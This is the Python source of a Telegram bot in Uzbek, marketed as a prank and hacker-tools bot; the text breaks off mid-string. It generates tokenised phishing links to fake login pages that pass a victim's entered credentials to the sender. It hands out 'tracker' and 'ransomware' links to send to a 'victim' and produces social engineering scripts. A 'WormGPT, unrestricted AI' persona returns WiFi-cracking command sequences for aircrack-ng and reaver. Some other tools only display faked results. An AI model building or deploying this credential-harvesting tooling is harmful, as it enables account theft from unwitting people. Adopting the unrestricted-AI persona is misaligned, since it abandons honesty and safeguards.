import asyncio
import logging
import html
import traceback
import io
from PIL import Image
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ReplyKeyboardMarkup, KeyboardButton
)
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes, ConversationHandler
)

from config import *
from database import *
from image_effects import process_image
from web_server import start_web_server, set_bot_app

logger = logging.getLogger(__name__)

# Conversation states
WAITING_RECEIPT = 1
SELECTED_EFFECT = 'selected_effect'
SELECTED_PACKAGE = 'selected_package'

# Admin Conversation states
ADMIN_PASSWORD = 10
ADMIN_MAIN = 11
ADMIN_SET_REFERRAL = 12
ADMIN_SET_DAILY = 13
ADMIN_GIFT_USER = 14
ADMIN_GIFT_AMOUNT = 15
ADMIN_BROADCAST_MSG = 16
ADMIN_ADD_CHANNEL = 17
ADMIN_REMOVE_CHANNEL = 18
ADMIN_CHANGE_ADM_PASS = 19
ADMIN_BLOCK_USR = 20
ADMIN_UNBLOCK_USR = 21
ADMIN_SELECT_PRICE = 22
ADMIN_ENTER_NEW_PRICE = 23

# ============================================================
# MAIN MENU KEYBOARD
# ============================================================


import json

def main_menu_keyboard():
    """Create the main menu keyboard."""
    keyboard = [
        [KeyboardButton("🎭 Prank yuborish"), KeyboardButton("🌐 Phishing sayt")],
    [KeyboardButton("🛡 Hackerlik bo'limi"), KeyboardButton("🖼 Rasm effektlari")],
    [KeyboardButton("👤 Profilim"), KeyboardButton("🔗 Referal")],
        [KeyboardButton("📊 Statistika"), KeyboardButton("💰 Limit sotib olish")],
        [KeyboardButton("ℹ️ Yordam")],
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)


# ============================================================
# FORCED SUBSCRIPTION CHECK
# ============================================================

async def get_prices():
    """Get package prices from database."""
    prices_json = await get_setting('prices')
    if prices_json:
        try:
            return json.loads(prices_json)
        except:
            pass
    return PRICES # Fallback to config.py if not in DB

async def check_subscription(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> list:
    """Check if user is subscribed to all required channels. Returns list of unsubscribed channels."""
    channels = await get_required_channels()
    unsubscribed = []
    for ch in channels:
        try:
            member = await context.bot.get_chat_member(
                chat_id=ch['channel_username'],
                user_id=user_id
            )
            if member.status not in ['administrator', 'creator', 'member', 'restricted']:
                unsubscribed.append(ch)
        except Exception as e:
            # If bot can't check, we should consider it as unsubscribed to be safe, 
            # OR skip it if it's a bot error. Let's log it.
            logger.warning(f"Could not check subscription in {ch['channel_username']} for {user_id}: {e}")
            # If it's a Forbidden error, the bot probably isn't in the channel
            unsubscribed.append(ch)
    return unsubscribed


def check_banned(func):
    """Decorator to check if user is banned."""
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if await is_user_banned(user_id):
            if update.message:
                await update.message.reply_text("⛔️ <b>Siz ban qilingansiz!</b>\n\nBotdan foydalanish huquqidan mahrum bo'lgansiz.", parse_mode='HTML')
            elif update.callback_query:
                await update.callback_query.answer("⛔️ Siz ban qilingansiz!", show_alert=True)
            return
        return await func(update, context, *args, **kwargs)
    return wrapper


def check_required_subscription(func):
    """Decorator to check if user is subscribed to all required channels."""
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        # Skip for admins
        if user_id == int(ADMIN_ID):
            return await func(update, context, *args, **kwargs)

        unsubscribed = await check_subscription(user_id, context)
        if unsubscribed:
            await send_subscription_message(update, context, unsubscribed)
            return
        return await func(update, context, *args, **kwargs)
    return wrapper


async def send_subscription_message(update: Update, context: ContextTypes.DEFAULT_TYPE, unsubscribed: list):
    """Send forced subscription message."""
    keyboard = []
    for ch in unsubscribed:
        title = ch['channel_title'] or ch['channel_username']
        username = ch['channel_username']
        
        if username.startswith('https://'):
            # It's an invite link already
            url = username
            # Try to make it a tg:// link if it's a join link
            if 't.me/+' in url:
                url = url.replace('https://t.me/+', 'tg://join?invite=')
            elif 't.me/joinchat/' in url:
                url = url.replace('https://t.me/joinchat/', 'tg://join?invite=')
        else:
            # It's a @username
            clean_username = username.lstrip('@')
            url = f"tg://resolve?domain={clean_username}"
            
        keyboard.append([InlineKeyboardButton(f"📢 {title}", url=url)])
    keyboard.append([InlineKeyboardButton("✅ Tekshirish", callback_data='check_sub')])

    text = (
        f"⚠️ <b>Majburiy obuna!</b>\n\n"
        f"Botdan foydalanish uchun quyidagi kanallarga obuna bo'ling:\n\n"
    )
    for ch in unsubscribed:
        title = ch['channel_title'] or ch['channel_username']
        text += f"📢 {title}\n"
    text += f"\nObuna bo'lgandan so'ng <b>✅ Tekshirish</b> tugmasini bosing."

    if update.callback_query:
        await update.callback_query.edit_message_text(
            text, parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        await update.message.reply_text(
            text, parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )


async def check_sub_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle subscription check button."""
    query = update.callback_query
    user_id = query.from_user.id
    unsubscribed = await check_subscription(user_id, context)
    if unsubscribed:
        await query.answer("❌ Hali barcha kanallarga obuna bo'lmadingiz!", show_alert=True)
        await send_subscription_message(update, context, unsubscribed)
    else:
        await query.answer("✅ Rahmat! Obuna tasdiqlandi!")
        # Instead of just text, show the main menu
        await query.message.delete()
        # Create a mock update to reuse start_command logic
        await start_command(update, context)


# ============================================================
# /start COMMAND
# ============================================================

@check_banned
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /start command."""
    user = update.effective_user
    args = context.args

    # Create user in database
    referrer_id = None
    if args and args[0].startswith('ref_'):
        try:
            referrer_id = int(args[0].replace('ref_', ''))
            if referrer_id == user.id:
                referrer_id = None
        except ValueError:
            pass

    if await is_user_banned(user.id):
        await update.message.reply_text("⛔️ Siz ban qilingansiz!")
        return

    await create_user(user.id, user.username, user.first_name, user.last_name or '', referrer_id)

    # Check forced subscription
    unsubscribed = await check_subscription(user.id, context)
    if unsubscribed:
        await send_subscription_message(update, context, unsubscribed)
        return

    # Fetch settings
    daily_limit = await get_setting('daily_limit', str(FREE_DAILY_LIMIT))
    ref_bonus = await get_setting('referral_bonus', str(REFERRAL_BONUS))

    # Process referral
    if referrer_id:
        success, bonus = await add_referral(referrer_id, user.id)
        if success:
            try:
                await context.bot.send_message(
                    chat_id=referrer_id,
                    text=f"🎉 Yangi referal!\n\n"
                         f"👤 {user.first_name} sizning havolangiz orqali qo'shildi!\n"
                         f"🎁 +{bonus} ta limit qo'shildi!"
                )
            except Exception:
                pass

    welcome_text = (
        f"👋 Salom, <b>{user.first_name}</b>!\n\n"
        f"🤖 <b>Prank Bot</b>ga xush kelibsiz!\n\n"
        f"Bu bot orqali siz:\n"
        f"🎭 Do'stlaringizga prank yuborishingiz\n"
        f"🖼 Rasmlarga maxsus effektlar qo'shishingiz\n"
        f"🔗 Do'stlarni taklif qilib limit olishingiz mumkin!\n\n"
        f"📌 Kunlik limit: <b>{daily_limit}</b> ta\n"
        f"🎁 Har bir referal: <b>+{ref_bonus}</b> ta limit\n\n"
        f"⬇️ Quyidagi tugmalardan birini bosing!"
    )

    if update.message:
        await update.message.reply_text(
            welcome_text,
            parse_mode='HTML',
            reply_markup=main_menu_keyboard()
        )
    elif update.callback_query:
        await context.bot.send_message(
            chat_id=user.id,
            text=welcome_text,
            parse_mode='HTML',
            reply_markup=main_menu_keyboard()
        )


# ============================================================
# PRANK SECTION
# ============================================================

@check_banned
@check_required_subscription
async def prank_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show the prank selection menu."""
    remaining, total = await get_remaining_limits(update.effective_user.id)

    keyboard = []
    row = []
    for key, name in PRANK_TYPES.items():
        row.append(InlineKeyboardButton(name, callback_data=f'prank_{key}'))
        if len(row) == 2:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)

    text = (
        f"🎭 <b>Prank tanlang!</b>\n\n"
        f"Do'stingizga yuborish uchun prank turini tanlang.\n"
        f"Bot sizga link beradi — uni do'stingizga yuboring!\n\n"
        f"📊 Qolgan limit: <b>{remaining}/{total}</b>"
    )

    await update.message.reply_text(
        text,
        parse_mode='HTML',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


# ============================================================
# PHISHING PRANK SECTION
# ============================================================

@check_banned
@check_required_subscription
async def phishing_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show the phishing site selection menu."""
    remaining, total = await get_remaining_limits(update.effective_user.id)

    keyboard = []
    row = []
    for key, name in PHISHING_TYPES.items():
        row.append(InlineKeyboardButton(name, callback_data=f'phish_{key}'))
        if len(row) == 2:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)

    text = (
        f"🌐 <b>Phishing saytni tanlang:</b>\n\n"
        f"Fake login sahifa turini tanlang.\n"
        f"Do'stingiz linkni ochib login qilmoqchi bo'ladi 😂\n\n"
        f"📊 Qolgan limit: <b>{remaining}/{total}</b>"
    )

    await update.message.reply_text(
        text,
        parse_mode='HTML',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


@check_banned
@check_required_subscription
async def phishing_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle phishing site selection - generate unique token link."""
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    site_type = query.data.replace('phish_', '')

    # Check limits
    can_use = await use_limit(user_id)
    if not can_use:
        remaining, total = await get_remaining_limits(user_id)
        await query.edit_message_text(
            f"⛔️ <b>Limitingiz tugadi!</b>\n\n"
            f"📊 Bugungi limit: {remaining}/{total}\n\n"
            f"Limit olish uchun:\n"
            f"🔗 Do'stlarni taklif qiling\n"
            f"💰 Yoki limit sotib oling",
            parse_mode='HTML'
        )
        return

    # Generate unique phishing token
    token = await create_phishing_token(user_id, site_type)
    
    site_name = PHISHING_TYPES.get(site_type, 'Sayt')
    phish_url = f"{WEB_BASE_URL}/prank/phish_{site_type}?t={token}"

    await add_prank_history(user_id, f'phish_{site_type}')
    remaining, total = await get_remaining_limits(user_id)

    await query.edit_message_text(
        f"✅ <b>{site_name}</b> sayti tayyor!\n\n"
        f"🔗 Link: {phish_url}\n\n"
        f"📤 Bu linkni do'stingizga yuboring!\n"
        f"Do'stingiz login qilmoqchi bo'lganda ma'lumotlari sizga keladi \n\n"
        f"📊 Qolgan limit: <b>{remaining}/{total}</b>",
        parse_mode='HTML'
    )


@check_banned
@check_required_subscription
async def prank_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle prank selection."""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    prank_type = query.data.replace('prank_', '')

    # Check limits
    can_use = await use_limit(user_id)
    if not can_use:
        remaining, total = await get_remaining_limits(user_id)
        await query.edit_message_text(
            f"⛔️ <b>Limitingiz tugadi!</b>\n\n"
            f"📊 Bugungi limit: {remaining}/{total}\n\n"
            f"Limit olish uchun:\n"
            f"🔗 Do'stlarni taklif qiling (+{REFERRAL_BONUS} ta)\n"
            f"💰 Yoki limit sotib oling",
            parse_mode='HTML'
        )
        return

    # Generate prank link
    prank_name = PRANK_TYPES.get(prank_type, 'Prank')
    prank_url = f"{WEB_BASE_URL}/prank/{prank_type}"
    
    await add_prank_history(user_id, prank_type)
    remaining, total = await get_remaining_limits(user_id)

    await query.edit_message_text(
        f"✅ <b>{prank_name}</b> tayyor!\n\n"
        f"🔗 Link: {prank_url}\n\n"
        f"📤 Bu linkni do'stingizga yuboring!\n"
        f"Do'stingiz ochganda prank boshlanadi 😂\n\n"
        f"📊 Qolgan limit: <b>{remaining}/{total}</b>",
        parse_mode='HTML'
    )


# ============================================================
# HACKER TOOLS SECTION
# ============================================================

@check_banned
@check_required_subscription
async def hacker_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show the hacker tools selection menu."""
    remaining, total = await get_remaining_limits(update.effective_user.id)

    keyboard = []
    row = []
    for key, info in HACKER_TOOLS.items():
        row.append(InlineKeyboardButton(f"{info['emoji']} {info['name']}", callback_data=f'hacker_{key}'))
        if len(row) == 2:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)

    text = (
        f"🛡 <b>Hackerlik bo'limi</b>\n\n"
        f"Kerakli asbobni tanlang:\n\n"
        f"📊 Qolgan limit: <b>{remaining}/{total}</b>"
    )

    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    else:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')


@check_banned
@check_required_subscription
async def hacker_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle hacker tool selection."""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    tool_key = query.data.replace('hacker_', '')
    tool_info = HACKER_TOOLS.get(tool_key)
    
    if not tool_info:
        await query.edit_message_text("❌ Noma'lum asbob!")
        return

    # Check limits for non-informational tools (everything costs 1 limit)
    can_use = await use_limit(user_id)
    remaining, total = await get_remaining_limits(user_id)
    
    if not can_use:
        await query.edit_message_text(
            f"⛔️ <b>Limitingiz tugadi!</b>\n\n"
            f"📊 Bugungi limit: {remaining}/{total}\n\n"
            f"Limit olish uchun:\n"
            f"🔗 Do'stlarni taklif qiling (+{REFERRAL_BONUS} ta)\n"
            f"💰 Yoki limit sotib oling",
            parse_mode='HTML'
        )
        return

    await add_hacker_history(user_id, tool_key)
    
    if tool_info['type'] == 'link':
        # Generate link tool (tracker, ransomware)
        token = await create_hacker_tool(user_id, tool_key)
        tool_url = f"{WEB_BASE_URL}/{tool_key}?t={token}"
        
        await query.edit_message_text(
            f"{tool_info['emoji']} <b>{tool_info['name']}</b> tayyor!\n\n"
            f"🔗 Link: {tool_url}\n\n"
            f"📤 Bu linkni qurbonningizga yuboring!\n"
            f"U linkni ochganda asbob ishga tushadi.\n\n"
            f"📊 Qolgan limit: <b>{remaining}/{total}</b>",
            parse_mode='HTML'
        )
    else:
        # Internal bot tool (osint, terminal, etc)
        back_btn = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Orqaga", callback_data='hacker_back')]])
        if tool_key == 'osint':
            await query.edit_message_text(f"🔍 <b>OSINT Qidiruv</b>\n\nMa'lumot topish uchun username, telefon yoki email kiriting:", parse_mode='HTML', reply_markup=back_btn)
            context.user_data['hacker_action'] = 'osint'
        elif tool_key == 'terminal':
            await query.edit_message_text(f"💻 <b>Terminal Emulator</b>\n\nLinux buyruqlarini kiriting (ls, pwd, help...):\n\nChiqish uchun <code>exit</code> yozing.", parse_mode='HTML', reply_markup=back_btn)
            context.user_data['hacker_action'] = 'terminal'
        elif tool_key == 'scanner':
            await query.edit_message_text(f"🔍 <b>Vulnerability Scanner</b>\n\nSkanerlash uchun sayt URL manzilini kiriting:", parse_mode='HTML', reply_markup=back_btn)
            context.user_data['hacker_action'] = 'vuln_scan'
        elif tool_key == 'deface':
            await query.edit_message_text(f"🖼 <b>Website Deface</b>\n\nDeface qilish uchun sayt URL manzilini kiriting:", parse_mode='HTML', reply_markup=back_btn)
            context.user_data['hacker_action'] = 'deface'
        elif tool_key == 'tempmail':
            import random, string
            email = "".join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@temp-mail.com"
            password = "".join(random.choices(string.ascii_letters + string.digits, k=12))
            back_btn_temp = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Orqaga", callback_data='hacker_back')]])
            disclaimer = "\n\n⚠️ <b>Emailni faqat to'g'ri yo'lda ishlating!</b> Agar noqonuniy ishlar qilsangiz, bot egasi javobgar emas."
            await query.edit_message_text(
                f"📧 <b>Vaqtinchalik Email</b>\n\n"
                f"Sizning emailingiz: <code>{email}</code>\n"
                f"Parol: <code>{password}</code>\n\n"
                f"♾ Bu email muddatsiz (bir umrlik) qoladi!\n"
                f"📊 Qolgan limit: <b>{remaining}/{total}</b>" + disclaimer,
                parse_mode='HTML',
                reply_markup=back_btn_temp
            )
        elif tool_key == 'se':
            await query.edit_message_text(
                f"📨 <b>Ijtimoiy Muhandislik</b>\n\n"
                f"Nishonning ismi yoki username-ni kiriting:",
                parse_mode='HTML',
                reply_markup=back_btn
            )
            context.user_data['hacker_action'] = 'se'
        elif tool_key == 'voice':
            await query.edit_message_text(
                f"🎤 <b>Ovoz O'zgartirgich</b>\n\n"
                f"O'zgartirmoqchi bo'lgan matnni yozing\n"
                f"(masalan: Salom, men hackermu!):",
                parse_mode='HTML',
                reply_markup=back_btn
            )
            context.user_data['hacker_action'] = 'voice'
        elif tool_key == 'exif':
            await query.edit_message_text(
                f"🧹 <b>EXIF Remover</b>\n\n"
                f"Metadata tozalash uchun rasm URL manzilini yuboring\n"
                f"yoki rasm faylini jo'nating:",
                parse_mode='HTML',
                reply_markup=back_btn
            )
            context.user_data['hacker_action'] = 'exif'
        elif tool_key == 'gpt':
            await query.edit_message_text(
                f"🤖 <b>WormGPT v6.6.6 — Cheklovsiz AI</b>\n\n"
                f"💀 Men WiFi buzish, SQL injection, phishing, malware yaratish, "
                f"OSINT, DDoS, anonimlik va boshqa barcha mavzularda cheklovsiz javob beraman.\n\n"
                f"📝 <b>Savolingizni yozing:</b>\n"
                f"<i>Masalan: 'WiFi parolini qanday buzish mumkin?' yoki 'Android telefon qanday hack qilinadi?'</i>",
                parse_mode='HTML',
                reply_markup=back_btn
            )
            context.user_data['hacker_action'] = 'gpt'
        else:
            await query.edit_message_text(f"⚙️ <b>{tool_info['name']}</b>\n\nBu funksiya hozircha ishlab chiqilmoqda...", parse_mode='HTML', reply_markup=back_btn)


async def hacker_back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle back button from hacker tools — return to hacker menu."""
    query = update.callback_query
    await query.answer()
    context.user_data.pop('hacker_action', None)
    # Show hacker menu again
    await hacker_menu(update, context)


async def osint_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process OSINT search request."""
    import random
    target = update.message.text.strip()
    msg = await update.message.reply_text(f"🔍 <b>{target}</b> bo'yicha qidirilmoqda...", parse_mode='HTML')
    
    steps = [
        "🛰 Sun'iy yo'ldosh bog'lanmoqda...",
        "📂 Ma'lumotlar bazasi skanerdan o'tkazilmoqda...",
        "🕵️ Social Media profillari qidirilmoqda...",
        "📡 IP manzillar tahlil qilinmoqda..."
    ]
    for step in steps:
        await asyncio.sleep(random.uniform(0.8, 1.5))
        await msg.edit_text(step)
    
    await asyncio.sleep(1.5)
    
    operators = ['Beeline', 'Uztelecom', 'Ucell', 'Mobiuz', 'Perfectum']
    devices = ['Android 13', 'iPhone 15 Pro', 'Windows 11', 'HarmonyOS', 'Linux']
    
    results = (
        f"✅ <b>OSINT Qidiruv natijalari:</b>\n"
        f"🎯 Nishon: <code>{target}</code>\n\n"
        f"📍 Taxminiy manzil: <b>O'zbekiston, {random.choice(['Toshkent', 'Samarqand', 'Buxoro', 'Farg\'ona', 'Namangan'])}</b>\n"
        f"📱 Qurilma: <b>{random.choice(devices)}</b>\n"
        f"📡 Operator: <b>{random.choice(operators)}</b>\n"
        f"🔐 Hackerlik darajasi: <b>{random.choice(['O\'rta', 'Yuqori', 'Professional'])}</b>\n\n"
        f"🎁 <i>Tizimga muvaffaqiyatli kirildi! Qo'shimcha ma'lumotlar yuklanmoqda...</i>"
    )
    disclaimer = "\n\n⚠️ <b>Faqat ta'lim maqsadida ishlating!</b> Bot egasi javobgar emas."
    await msg.edit_text(results + disclaimer, parse_mode='HTML')
    context.user_data.pop('hacker_action', None)



async def terminal_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process Terminal emulator commands."""
    cmd = update.message.text.strip().lower()
    
    responses = {
        'help': "Sizning buyruqlaringiz:\n- ls: Fayllarni ko'rish\n- pwd: Hozirgi joy\n- whoami: Men kimman\n- hack nasa: NASA ni buzish\n- ifconfig: Tarmoq ma'lumotlari\n- uname -a: Tizim haqida\n- clear: Tozalash\n- exit: Terminaldan chiqish",
        'ls': "bin/  dev/  etc/  home/  root/  usr/  var/\nsecret_passwords.txt  database.db  config.sh",
        'pwd': "/root/home/hacker",
        'whoami': "root (SuperUser)",
        'hack nasa': "🚀 NASA buzilmoqda...\n[###-------] 30%\n[######----] 60%\n[#########-] 90%\n[##########] 100%\n✅ NASA tizimi nazorat ostida!",
        'ifconfig': "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 192.168.1.105  netmask 255.255.255.0  broadcast 192.168.1.255",
        'uname -a': "Linux hacker-vps 5.15.0-72-generic #79-Ubuntu SMP Wed Apr 19 08:22:18 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux",
        'clear': "Terminal tozalandi.",
        'exit': "Terminal yopildi."
    }
    
    if cmd == 'exit':
        await update.message.reply_text("👋 Terminal yopildi.", reply_markup=main_menu_keyboard())
        context.user_data.pop('hacker_action', None)
        return

    if cmd == 'clear':
        await update.message.reply_text("<code>Terminal tozalandi...</code>", parse_mode='HTML')
        return

    res = responses.get(cmd, f"sh: command not found: {cmd}")
    await update.message.reply_text(f"<code>{res}</code>", parse_mode='HTML')



async def vuln_scan_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process Vulnerability Scanner request."""
    url = update.message.text.strip()
    msg = await update.message.reply_text(f"🛡 <b>{url}</b> skanerlanmoqda...")
    
    await asyncio.sleep(2)
    await msg.edit_text("🔍 Portlar tekshirilmoqda (80, 443, 22, 3306)...")
    await asyncio.sleep(2)
    await msg.edit_text("🧪 SQL Injection va XSS sinab ko'rilmoqda...")
    await asyncio.sleep(2)
    
    report = (
        f"📊 <b>Hackerlik Hisoboti:</b>\n"
        f"🌐 Sayt: {url}\n\n"
        f"🔴 SQL Injection: <b>XAVFLI!</b>\n"
        f"🟠 XSS: <b>ZAIFLIK TOPILDI</b>\n"
        f"🟡 SSL: <b>ESKIRGAN</b>\n\n"
        f"💡 Maslahat: DB drayverlarini yangilang!"
    )
    disclaimer = "\n\n⚠️ <b>Faqat to'g'ri yo'lda ishlating!</b> Bot egasi javobgar emas."
    await msg.edit_text(report + disclaimer, parse_mode='HTML')
    context.user_data.pop('hacker_action', None)


async def deface_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process Website Deface simulation."""
    url = update.message.text.strip()
    msg = await update.message.reply_text(f"🖼 <b>{url}</b> deface qilinmoqda...")
    
    await asyncio.sleep(2)
    await msg.edit_text("🎨 Yangi index.html yuklanmoqda...")
    await asyncio.sleep(2)
    
    await msg.edit_text(
        f"✅ <b>{url}</b> muvaffaqiyatli deface qilindi!\n\n"
        f"🎭 Sayt endi: <b>'Hacked by Anonymous'</b> ko'rinishida!\n\n"
        f"⚠️ <b>Faqat to'g'ri yo'lda ishlating!</b> Bot egasi javobgar emas.",
        parse_mode='HTML'
    )
    context.user_data.pop('hacker_action', None)


async def se_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process Social Engineering request."""
    import random
    target = update.message.text.strip()
    msg = await update.message.reply_text(f"📨 <b>{target}</b> uchun strategiya tuzilmoqda...")
    
    await asyncio.sleep(2)
    await msg.edit_text("🧠 Psixologik profil tahlil qilinmoqda...")
    await asyncio.sleep(2)
    await msg.edit_text("📋 Strategiya tayyorlanmoqda...")
    await asyncio.sleep(1.5)
    
    channels = ['Telegram', 'Instagram', 'SMS', 'WhatsApp', 'Email']
    scenarios = [
        "'Tabriklaymiz! Siz g'olib bo'ldingiz'",
        "'Hisobingiz xavf ostida, tekshiring'",
        "'Sizga maxsus taklif - faqat bugun'",
        "'Do'stingiz sizga sovg'a yubordi'"
    ]
    
    strategy = (
        f"💡 <b>Ijtimoiy Muhandislik Strategiyasi</b>\n"
        f"🎯 Nishon: <code>{target}</code>\n\n"
        f"🎭 <b>Ssenariy:</b> {random.choice(scenarios)}\n"
        f"📱 <b>Kanal:</b> {random.choice(channels)} orqali\n"
        f"🔑 <b>Kalit so'zlar:</b> 'Shoshiling', 'Faqat siz uchun'\n"
        f"⏰ <b>Vaqt:</b> Kechqurun 20:00-22:00\n\n"
        f"📌 <b>Qadamlar:</b>\n"
        f"1. Ishonch hosil qiling (salom, qanday ahvolingiz)\n"
        f"2. Phishing linkni yuboring\n"
        f"3. Shoshilinchlik hissi yarating\n\n"
        f"⚠️ <i>Bu faqat ta'lim maqsadida!</i>"
    )
    disclaimer = "\n\n⚠️ <b>Faqat to'g'ri yo'lda ishlating!</b> Bot egasi javobgar emas."
    await msg.edit_text(strategy + disclaimer, parse_mode='HTML')
    context.user_data.pop('hacker_action', None)


async def voice_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process Voice Changer request."""
    import random
    text_input = update.message.text.strip()
    msg = await update.message.reply_text("🎤 Ovoz generatsiya qilinmoqda...")
    
    await asyncio.sleep(2)
    await msg.edit_text("🔄 Ovoz chastotasi o'zgartirilmoqda...")
    await asyncio.sleep(2)
    
    effects = ['Robot ovozi', 'Chuqur ovoz', 'Baland ovoz', 'Demon ovozi', 'Ayol ovozi']
    chosen = random.choice(effects)
    
    await msg.edit_text(
        f"✅ <b>Ovoz O'zgartirgich</b>\n\n"
        f"📝 Matn: <code>{text_input[:100]}</code>\n"
        f"🎭 Effekt: <b>{chosen}</b>\n"
        f"📊 Sifat: <b>HD 320kbps</b>\n\n"
        f"🔊 <i>Ovozli xabar tayyor! (Simulyatsiya)</i>\n"
        f"📌 Haqiqiy ovoz o'zgartirish tez orada qo'shiladi.\n\n"
        f"⚠️ <b>Faqat to'g'ri yo'lda ishlating!</b> Bot egasi javobgar emas.",
        parse_mode='HTML'
    )
    context.user_data.pop('hacker_action', None)


async def gpt_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process Hacker GPT request — WormGPT style advanced AI."""
    import random
    query_text = update.message.text.strip()
    query_lower = query_text.lower()
    
    # Multi-step loading animation
    loading_steps = [
        "⚡ <b>[SYSTEM]</b> WormGPT v6.6.6 yuklanmoqda...",
        "🔓 <b>[ACCESS GRANTED]</b> DarkWeb ma'lumotlar bazasi ochildi...",
        "🧠 <b>[ANALYZING]</b> So'rov tahlil qilinmoqda...",
        "📡 <b>[DARKNET]</b> Natijalar yig'ilmoqda..."
    ]
    
    msg = await update.message.reply_text(loading_steps[0], parse_mode='HTML')
    for step_text in loading_steps[1:]:
        await asyncio.sleep(random.uniform(0.8, 1.3))
        await msg.edit_text(step_text, parse_mode='HTML')
    await asyncio.sleep(0.8)

    # ===== CATEGORY-BASED INTELLIGENT RESPONSES =====
    
    # WiFi / Network Hacking
    wifi_keywords = ['wifi', 'wi-fi', 'parol', 'router', 'tarmoq', 'network', 'wpa', 'wps', 'hack wifi', 'wifi buzish']
    # SQL Injection
    sql_keywords = ['sql', 'injection', 'sqli', 'database', 'baza', "ma'lumotlar bazasi", 'mysql', 'postgres']
    # Phishing / Social Engineering
    phish_keywords = ['phishing', 'fishing', 'login', 'sahifa', 'fake', 'ijtimoiy', 'muhandislik', 'social engineering', 'se']
    # Anonymity / VPN / Tor
    anon_keywords = ['anonim', 'vpn', 'tor', 'proxy', 'yashirin', 'maxfiy', 'iz qoldirmaslik', 'darknet', 'dark web', 'onion']
    # Password cracking
    pass_keywords = ['parol buzish', 'password', 'brute', 'bruteforce', 'hash', 'crack', 'wordlist', 'dictionary']
    # RAT / Trojan / Malware
    rat_keywords = ['rat', 'trojan', 'virus', 'malware', 'keylogger', 'backdoor', 'payload', 'exploit', 'shell', 'reverse']
    # DDoS / DoS
    ddos_keywords = ['ddos', 'dos', 'attack', 'hujum', 'server', 'tushirish', 'bot attack', 'stress test']
    # OSINT
    osint_keywords = ['osint', 'qidirish', 'topish', 'telefon raqam', 'username', 'kimni', 'aniqlash', 'deanon', 'sherlock']
    # IP / Tracking
    ip_keywords = ['ip', 'manzil', 'joylashuv', 'tracker', 'geolocate', 'lokatsiya', 'qayerda']
    # Telegram hacking
    tg_keywords = ['telegram', 'tg', 'akkaunt', 'kanal', 'bot yaratish', 'telegram buzish', 'session']
    # Instagram hacking
    insta_keywords = ['instagram', 'insta', 'ig', 'instagram buzish', 'instagram parol']
    # Cryptography / Encryption
    crypto_keywords = ['shifrlash', 'shifrini', 'encrypt', 'decrypt', 'hash', 'md5', 'sha', 'kriptografiya', 'rsa']
    # XSS
    xss_keywords = ['xss', 'cross site', 'script', 'javascript injection', 'cookie', 'session steal']
    # Phone hacking
    phone_keywords = ['telefon', 'android', 'iphone', 'mobil', 'apk', 'spy', 'telefon buzish', 'sms']
    # General hacking / how to start
    general_keywords = ['hacker', 'o\'rganish', 'boshlash', 'qanday', 'nima', 'nimadan', "bo'lish", 'kurs', 'dastur']

    def match_category(keywords):
        return any(kw in query_lower for kw in keywords)

    if match_category(wifi_keywords):
        response = (
            f"📡 <b>[WormGPT] WiFi Penetration Testing</b>\n\n"
            f"🎯 So'rov: <code>{query_text[:60]}</code>\n\n"
            f"<b>━━━ METODLAR ━━━</b>\n\n"
            f"🔴 <b>1. WPA/WPA2 Handshake Capture:</b>\n"
            f"<code>airmon-ng start wlan0\n"
            f"airodump-ng wlan0mon\n"
            f"airodump-ng -c [CH] --bssid [BSSID] -w capture wlan0mon\n"
            f"aireplay-ng -0 10 -a [BSSID] wlan0mon</code>\n\n"
            f"🟡 <b>2. WPS Pin Attack:</b>\n"
            f"<code>wash -i wlan0mon\n"
            f"reaver -i wlan0mon -b [BSSID] -vv</code>\n\n"
            f"🟢 <b>3. Evil Twin Attack:</b>\n"
            f"Soxta WiFi nuqta yaratib, qurbonni u orqali ulash.\n"
            f"Tool: <code>Fluxion</code> yoki <code>Wifiphisher</code>\n\n"
            f"🔧 <b>Kerakli toollar:</b> Kali Linux, Aircrack-ng Suite, Hashcat\n\n"
